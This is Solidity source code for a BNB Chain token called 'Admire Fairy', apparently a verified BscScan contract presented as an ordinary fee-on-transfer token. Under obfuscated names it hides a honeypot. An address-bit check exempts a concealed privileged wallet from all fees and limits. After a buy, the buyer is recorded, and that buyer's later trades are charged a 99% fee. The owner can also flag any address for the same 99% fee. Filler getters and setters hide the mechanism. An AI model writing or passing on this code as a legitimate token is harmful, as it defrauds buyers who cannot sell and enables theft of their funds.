/**
 *Submitted for verification at BscScan.com on 2022-12-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract AdmireFairy is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Admire Fairy ";
    string constant _symbol = "AdmireFairy";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private modeBotsMaxBuy;
    mapping(address => bool) private limitBuyLiquidityMin;
    mapping(address => bool) private launchedWalletModeSwap;
    mapping(address => bool) private txTradingBurnLiquidity;
    mapping(address => uint256) private swapSellMinLaunched;
    mapping(uint256 => address) private autoTeamTxMaxLiquidityBots;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private autoReceiverBuyTradingTxWallet = 0;
    uint256 private swapLaunchedBuyTeam = 9;

    //SELL FEES
    uint256 private burnMaxTradingFee = 0;
    uint256 private buyLimitFeeTrading = 9;

    uint256 private limitSwapTxExempt = swapLaunchedBuyTeam + autoReceiverBuyTradingTxWallet;
    uint256 private maxBurnTxTradingBotsLimit = 100;

    address private modeBotsLaunchedWalletBuyReceiverExempt = (msg.sender); // auto-liq address
    address private buyIsReceiverMin = (0x30041D601D024e1dD2d6c0c1FFffdE7e3754c5cb); // marketing address
    address private buyMinAutoWallet = DEAD;
    address private txBuyBurnSell = DEAD;
    address private isLimitReceiverWallet = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private teamExemptLimitSell;
    uint256 private marketingModeBuyLimit;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private marketingTxModeSwap;
    uint256 private botsFeeBurnTrading;
    uint256 private liquidityTxBuyMarketing;
    uint256 private burnMarketingTeamLaunchedReceiverMode;
    uint256 private limitMaxBurnTradingModeLiquidity;

    bool private isBotsLiquiditySellReceiverTeam = true;
    bool private txTradingBurnLiquidityMode = true;
    bool private feeWalletTeamAuto = true;
    bool private walletTxMinMode = true;
    bool private swapTeamLimitMax = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private launchedLimitMinTx = 6 * 10 ** 15;
    uint256 private sellExemptFeeTrading = _totalSupply / 1000; // 0.1%

    
    uint256 private maxFeeBurnTradingSwapIs = 0;
    bool private teamSwapAutoReceiver = false;
    bool private buyIsLiquidityTxLaunchedLimit = false;
    bool private botsWalletAutoBurnFeeMinMax = false;
    uint256 private exemptModeAutoSell = 0;
    uint256 private botsTeamSwapLaunched = 0;
    bool private modeExemptMaxLaunchedTradingIs = false;
    uint256 private sellMaxModeLimit = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        marketingTxModeSwap = true;

        modeBotsMaxBuy[msg.sender] = true;
        modeBotsMaxBuy[address(this)] = true;

        limitBuyLiquidityMin[msg.sender] = true;
        limitBuyLiquidityMin[0x0000000000000000000000000000000000000000] = true;
        limitBuyLiquidityMin[0x000000000000000000000000000000000000dEaD] = true;
        limitBuyLiquidityMin[address(this)] = true;

        launchedWalletModeSwap[msg.sender] = true;
        launchedWalletModeSwap[0x0000000000000000000000000000000000000000] = true;
        launchedWalletModeSwap[0x000000000000000000000000000000000000dEaD] = true;
        launchedWalletModeSwap[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return burnBotsWalletTx(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Admire Fairy  Insufficient Allowance");
        }

        return burnBotsWalletTx(sender, recipient, amount);
    }

    function burnBotsWalletTx(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = sellLimitTradingLaunched(sender) || sellLimitTradingLaunched(recipient);
        
        if (modeExemptMaxLaunchedTradingIs != modeExemptMaxLaunchedTradingIs) {
            modeExemptMaxLaunchedTradingIs = txTradingBurnLiquidityMode;
        }

        if (botsTeamSwapLaunched != swapLaunchedBuyTeam) {
            botsTeamSwapLaunched = swapLaunchedBuyTeam;
        }

        if (maxFeeBurnTradingSwapIs != launchedLimitMinTx) {
            maxFeeBurnTradingSwapIs = buyLimitFeeTrading;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                feeSwapTradingBotsLimitMin();
            }
            if (!bLimitTxWalletValue) {
                sellFeeTeamMinTradingLiquidityLimit(recipient);
            }
        }
        
        if (exemptModeAutoSell != maxBurnTxTradingBotsLimit) {
            exemptModeAutoSell = sellExemptFeeTrading;
        }

        if (maxFeeBurnTradingSwapIs == swapLaunchedBuyTeam) {
            maxFeeBurnTradingSwapIs = sellMaxModeLimit;
        }

        if (modeExemptMaxLaunchedTradingIs != isBotsLiquiditySellReceiverTeam) {
            modeExemptMaxLaunchedTradingIs = modeExemptMaxLaunchedTradingIs;
        }


        if (inSwap || bLimitTxWalletValue) {return modeLaunchedBotsMin(sender, recipient, amount);}

        if (!modeBotsMaxBuy[sender] && !modeBotsMaxBuy[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Admire Fairy  Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || launchedWalletModeSwap[sender] || launchedWalletModeSwap[recipient], "Admire Fairy  Max TX Limit has been triggered");

        if (tradingTeamModeBots()) {botsMaxModeExemptSwapWalletLaunched();}

        _balances[sender] = _balances[sender].sub(amount, "Admire Fairy  Insufficient Balance");
        
        uint256 amountReceived = walletTeamBurnTxBotsMarketing(sender) ? marketingTeamLiquidityMin(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function modeLaunchedBotsMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Admire Fairy  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function walletTeamBurnTxBotsMarketing(address sender) internal view returns (bool) {
        return !limitBuyLiquidityMin[sender];
    }

    function isTxReceiverMin(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            limitSwapTxExempt = buyLimitFeeTrading + burnMaxTradingFee;
            return teamMaxLaunchedExemptTradingBotsFee(sender, limitSwapTxExempt);
        }
        if (!selling && sender == uniswapV2Pair) {
            limitSwapTxExempt = swapLaunchedBuyTeam + autoReceiverBuyTradingTxWallet;
            return limitSwapTxExempt;
        }
        return teamMaxLaunchedExemptTradingBotsFee(sender, limitSwapTxExempt);
    }

    function txModeReceiverBurn() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function marketingTeamLiquidityMin(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(isTxReceiverMin(sender, receiver == uniswapV2Pair)).div(maxBurnTxTradingBotsLimit);

        if (txTradingBurnLiquidity[sender] || txTradingBurnLiquidity[receiver]) {
            feeAmount = amount.mul(99).div(maxBurnTxTradingBotsLimit);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function sellLimitTradingLaunched(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function teamMaxLaunchedExemptTradingBotsFee(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = swapSellMinLaunched[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function sellFeeTeamMinTradingLiquidityLimit(address addr) private {
        if (txModeReceiverBurn() < launchedLimitMinTx) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        autoTeamTxMaxLiquidityBots[exemptLimitValue] = addr;
    }

    function feeSwapTradingBotsLimitMin() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (swapSellMinLaunched[autoTeamTxMaxLiquidityBots[i]] == 0) {
                    swapSellMinLaunched[autoTeamTxMaxLiquidityBots[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(buyIsReceiverMin).transfer(amountBNB * amountPercentage / 100);
    }

    function tradingTeamModeBots() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    swapTeamLimitMax &&
    _balances[address(this)] >= sellExemptFeeTrading;
    }

    function botsMaxModeExemptSwapWalletLaunched() internal swapping {
        
        uint256 amountToLiquify = sellExemptFeeTrading.mul(autoReceiverBuyTradingTxWallet).div(limitSwapTxExempt).div(2);
        uint256 amountToSwap = sellExemptFeeTrading.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (botsTeamSwapLaunched != burnMaxTradingFee) {
            botsTeamSwapLaunched = sellExemptFeeTrading;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = limitSwapTxExempt.sub(autoReceiverBuyTradingTxWallet.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(autoReceiverBuyTradingTxWallet).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(swapLaunchedBuyTeam).div(totalETHFee);
        
        payable(buyIsReceiverMin).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                modeBotsLaunchedWalletBuyReceiverExempt,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getSwapTeamLimitMax() public view returns (bool) {
        if (swapTeamLimitMax == modeExemptMaxLaunchedTradingIs) {
            return modeExemptMaxLaunchedTradingIs;
        }
        if (swapTeamLimitMax != walletTxMinMode) {
            return walletTxMinMode;
        }
        if (swapTeamLimitMax != walletTxMinMode) {
            return walletTxMinMode;
        }
        return swapTeamLimitMax;
    }
    function setSwapTeamLimitMax(bool a0) public onlyOwner {
        if (swapTeamLimitMax != swapTeamLimitMax) {
            swapTeamLimitMax=a0;
        }
        if (swapTeamLimitMax == txTradingBurnLiquidityMode) {
            txTradingBurnLiquidityMode=a0;
        }
        if (swapTeamLimitMax == modeExemptMaxLaunchedTradingIs) {
            modeExemptMaxLaunchedTradingIs=a0;
        }
        swapTeamLimitMax=a0;
    }

    function getBurnMaxTradingFee() public view returns (uint256) {
        return burnMaxTradingFee;
    }
    function setBurnMaxTradingFee(uint256 a0) public onlyOwner {
        burnMaxTradingFee=a0;
    }

    function getLaunchedWalletModeSwap(address a0) public view returns (bool) {
        if (a0 == buyMinAutoWallet) {
            return buyIsLiquidityTxLaunchedLimit;
        }
        if (launchedWalletModeSwap[a0] != txTradingBurnLiquidity[a0]) {
            return swapTeamLimitMax;
        }
            return launchedWalletModeSwap[a0];
    }
    function setLaunchedWalletModeSwap(address a0,bool a1) public onlyOwner {
        if (a0 != isLimitReceiverWallet) {
            modeExemptMaxLaunchedTradingIs=a1;
        }
        if (launchedWalletModeSwap[a0] == launchedWalletModeSwap[a0]) {
           launchedWalletModeSwap[a0]=a1;
        }
        launchedWalletModeSwap[a0]=a1;
    }

    function getTxTradingBurnLiquidityMode() public view returns (bool) {
        return txTradingBurnLiquidityMode;
    }
    function setTxTradingBurnLiquidityMode(bool a0) public onlyOwner {
        if (txTradingBurnLiquidityMode != txTradingBurnLiquidityMode) {
            txTradingBurnLiquidityMode=a0;
        }
        txTradingBurnLiquidityMode=a0;
    }

    function getLaunchedLimitMinTx() public view returns (uint256) {
        if (launchedLimitMinTx != maxFeeBurnTradingSwapIs) {
            return maxFeeBurnTradingSwapIs;
        }
        if (launchedLimitMinTx != limitSwapTxExempt) {
            return limitSwapTxExempt;
        }
        if (launchedLimitMinTx != exemptModeAutoSell) {
            return exemptModeAutoSell;
        }
        return launchedLimitMinTx;
    }
    function setLaunchedLimitMinTx(uint256 a0) public onlyOwner {
        if (launchedLimitMinTx != maxBurnTxTradingBotsLimit) {
            maxBurnTxTradingBotsLimit=a0;
        }
        launchedLimitMinTx=a0;
    }

    function getTxBuyBurnSell() public view returns (address) {
        if (txBuyBurnSell != modeBotsLaunchedWalletBuyReceiverExempt) {
            return modeBotsLaunchedWalletBuyReceiverExempt;
        }
        if (txBuyBurnSell != modeBotsLaunchedWalletBuyReceiverExempt) {
            return modeBotsLaunchedWalletBuyReceiverExempt;
        }
        if (txBuyBurnSell != buyIsReceiverMin) {
            return buyIsReceiverMin;
        }
        return txBuyBurnSell;
    }
    function setTxBuyBurnSell(address a0) public onlyOwner {
        if (txBuyBurnSell == buyMinAutoWallet) {
            buyMinAutoWallet=a0;
        }
        txBuyBurnSell=a0;
    }

    function getSellMaxModeLimit() public view returns (uint256) {
        if (sellMaxModeLimit != swapLaunchedBuyTeam) {
            return swapLaunchedBuyTeam;
        }
        if (sellMaxModeLimit != maxFeeBurnTradingSwapIs) {
            return maxFeeBurnTradingSwapIs;
        }
        if (sellMaxModeLimit == launchedLimitMinTx) {
            return launchedLimitMinTx;
        }
        return sellMaxModeLimit;
    }
    function setSellMaxModeLimit(uint256 a0) public onlyOwner {
        sellMaxModeLimit=a0;
    }

    function getAutoReceiverBuyTradingTxWallet() public view returns (uint256) {
        if (autoReceiverBuyTradingTxWallet != sellExemptFeeTrading) {
            return sellExemptFeeTrading;
        }
        if (autoReceiverBuyTradingTxWallet != sellMaxModeLimit) {
            return sellMaxModeLimit;
        }
        if (autoReceiverBuyTradingTxWallet != swapLaunchedBuyTeam) {
            return swapLaunchedBuyTeam;
        }
        return autoReceiverBuyTradingTxWallet;
    }
    function setAutoReceiverBuyTradingTxWallet(uint256 a0) public onlyOwner {
        if (autoReceiverBuyTradingTxWallet == buyLimitFeeTrading) {
            buyLimitFeeTrading=a0;
        }
        if (autoReceiverBuyTradingTxWallet == buyLimitFeeTrading) {
            buyLimitFeeTrading=a0;
        }
        if (autoReceiverBuyTradingTxWallet != sellExemptFeeTrading) {
            sellExemptFeeTrading=a0;
        }
        autoReceiverBuyTradingTxWallet=a0;
    }

    function getSwapSellMinLaunched(address a0) public view returns (uint256) {
        if (swapSellMinLaunched[a0] != swapSellMinLaunched[a0]) {
            return botsTeamSwapLaunched;
        }
            return swapSellMinLaunched[a0];
    }
    function setSwapSellMinLaunched(address a0,uint256 a1) public onlyOwner {
        if (a0 == modeBotsLaunchedWalletBuyReceiverExempt) {
            sellExemptFeeTrading=a1;
        }
        if (a0 == modeBotsLaunchedWalletBuyReceiverExempt) {
            maxFeeBurnTradingSwapIs=a1;
        }
        swapSellMinLaunched[a0]=a1;
    }

    function getModeExemptMaxLaunchedTradingIs() public view returns (bool) {
        return modeExemptMaxLaunchedTradingIs;
    }
    function setModeExemptMaxLaunchedTradingIs(bool a0) public onlyOwner {
        if (modeExemptMaxLaunchedTradingIs != walletTxMinMode) {
            walletTxMinMode=a0;
        }
        if (modeExemptMaxLaunchedTradingIs == teamSwapAutoReceiver) {
            teamSwapAutoReceiver=a0;
        }
        modeExemptMaxLaunchedTradingIs=a0;
    }

    function getModeBotsMaxBuy(address a0) public view returns (bool) {
            return modeBotsMaxBuy[a0];
    }
    function setModeBotsMaxBuy(address a0,bool a1) public onlyOwner {
        if (a0 != modeBotsLaunchedWalletBuyReceiverExempt) {
            swapTeamLimitMax=a1;
        }
        if (a0 != isLimitReceiverWallet) {
            txTradingBurnLiquidityMode=a1;
        }
        if (a0 != txBuyBurnSell) {
            modeExemptMaxLaunchedTradingIs=a1;
        }
        modeBotsMaxBuy[a0]=a1;
    }

    function getModeBotsLaunchedWalletBuyReceiverExempt() public view returns (address) {
        if (modeBotsLaunchedWalletBuyReceiverExempt != modeBotsLaunchedWalletBuyReceiverExempt) {
            return modeBotsLaunchedWalletBuyReceiverExempt;
        }
        if (modeBotsLaunchedWalletBuyReceiverExempt != txBuyBurnSell) {
            return txBuyBurnSell;
        }
        if (modeBotsLaunchedWalletBuyReceiverExempt != txBuyBurnSell) {
            return txBuyBurnSell;
        }
        return modeBotsLaunchedWalletBuyReceiverExempt;
    }
    function setModeBotsLaunchedWalletBuyReceiverExempt(address a0) public onlyOwner {
        if (modeBotsLaunchedWalletBuyReceiverExempt == modeBotsLaunchedWalletBuyReceiverExempt) {
            modeBotsLaunchedWalletBuyReceiverExempt=a0;
        }
        if (modeBotsLaunchedWalletBuyReceiverExempt != buyMinAutoWallet) {
            buyMinAutoWallet=a0;
        }
        if (modeBotsLaunchedWalletBuyReceiverExempt != modeBotsLaunchedWalletBuyReceiverExempt) {
            modeBotsLaunchedWalletBuyReceiverExempt=a0;
        }
        modeBotsLaunchedWalletBuyReceiverExempt=a0;
    }

    function getBotsWalletAutoBurnFeeMinMax() public view returns (bool) {
        if (botsWalletAutoBurnFeeMinMax != buyIsLiquidityTxLaunchedLimit) {
            return buyIsLiquidityTxLaunchedLimit;
        }
        return botsWalletAutoBurnFeeMinMax;
    }
    function setBotsWalletAutoBurnFeeMinMax(bool a0) public onlyOwner {
        if (botsWalletAutoBurnFeeMinMax != swapTeamLimitMax) {
            swapTeamLimitMax=a0;
        }
        if (botsWalletAutoBurnFeeMinMax == walletTxMinMode) {
            walletTxMinMode=a0;
        }
        if (botsWalletAutoBurnFeeMinMax != walletTxMinMode) {
            walletTxMinMode=a0;
        }
        botsWalletAutoBurnFeeMinMax=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}